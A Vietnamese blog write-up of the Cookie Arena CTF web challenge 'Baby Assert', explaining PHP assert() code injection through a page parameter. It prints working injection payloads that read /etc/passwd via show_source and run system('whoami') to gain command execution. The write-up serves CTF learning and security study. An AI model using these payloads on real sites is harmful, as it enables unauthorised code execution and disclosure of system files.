---
title: Write-Up Baby Assert
date: 2023-09-15 3:55:00 +0700
categories: [CTF, Cookie Hân Hoan, Write-Up, Web]
tags: [web, write-up, ctf]     # TAG names should always be lowercase
---
Địa chỉ : **[Baby Assert](https://battle.cookiearena.org/challenges/web/baby-assert)**

## Challenge Detail

Trong PHP, có rất nhiều cách để thay thế lệnh điều khiển If Else. Tuy nhiên, không phải lập trình viên nào cũng lường trước được những hậu quả nghiêm trọng khi sử dụng và thiết lập những tham số an toàn trên môi trường Production.

## Tags

- php
- Assert
- Code Injection

## Web Analysis:


- Tại `/index.php` trang web:

Có 3 Nút home, about và Secret mình xem thử từng cái.

![Untitled](/assets/writeup/cookie/BabyAssert/0.png)

Ta thấy ở trang web có 1 parameter **`?page=`**  ngay lúc này mình đã test về lỗi LFI ( ../ , ….//)  tuy nhiên nó đã không thực thi.

Quan sát thì web có gợi ý 1 đoạn code của trang web này:

```php
$file = "pages/" . $page . ".php";
assert(...$file...) or die("Detected hacking attempt!");
require_once $file;
```

Lúc này mình thấy có hàm `assert` có vẻ kì lạ…

- Tại `ABOUT`trang web:

![Untitled](/assets/writeup/cookie/BabyAssert/1.png)

Không có gì đặc biệt.

- Tại `SECRET` trang web:

![Untitled](/assets/writeup/cookie/BabyAssert/2.png)

Ta thấy `file flag` được đặt tên + thêm ký tự random. Vậy cho dù mình có thực thi được ../ lỗi LFI thì cũng không thể biết được tên cụ thể của file flag mà xem được. Nên phải RCE hệ thống.

`+1dea: RCE`

## PHÂN TÍCH ASSERT

Ở lúc này thì mình chưa biết về hàm assert hoạt động như thế nào và tìm hiểu nó.

![Untitled](/assets/writeup/cookie/BabyAssert/3.png)

![Untitled](/assets/writeup/cookie/BabyAssert/4.png)

chi tiết ở : [how assertions can get you hacked](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)

Vậy thì giải thích sơ

`**Assert()**` là một hàm đánh giá một biểu thức PHP nhất định và nếu biểu thức đánh giá là **`false`**, nó sẽ tạo ra một thông báo cảnh báo hoặc gây ra lỗi nghiêm trọng tùy thuộc vào cấu hình PHP. Nó thường được sử dụng cho mục đích gỡ lỗi và thử nghiệm.

Tuy nhiên, **`assert()`**có thể trở thành rủi ro bảo mật khi sử dụng không đúng cách, đặc biệt khi dữ liệu do người dùng kiểm soát được truyền trực tiếp vào chức **`assert()`**năng mà không được xác thực hoặc khử trùng thích hợp.

## Exploiting Assert()

**PAYLOAD AT HACKTRICK : [CLICK](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert)**

![Untitled](/assets/writeup/cookie/BabyAssert/5.png)

ở đây để RCE thì ta inject vào 1 chuổi và +PHP 

thì nó có thể thực thi command như là webshell

Thử nghiệm

```php
PAYLOAD:
' and die(show_source('/etc/passwd')) or ‘
```

![Untitled](/assets/writeup/cookie/BabyAssert/6.png)

Nó đã thực thi được payload của chúng ta tuy nhiên không biết file flag tên gì nên mình phải RCE.

```php
PAYLOAD:
' and die(system("whoami")) or '
```

![Untitled](/assets/writeup/cookie/BabyAssert/7.png)

THÀNH CÔNG RỒI 

việc còn lại là xem file FLag

![Untitled](/assets/writeup/cookie/BabyAssert/8.png)

![Untitled](/assets/writeup/cookie/BabyAssert/9.png)

DONE =)))

`Written by Ren`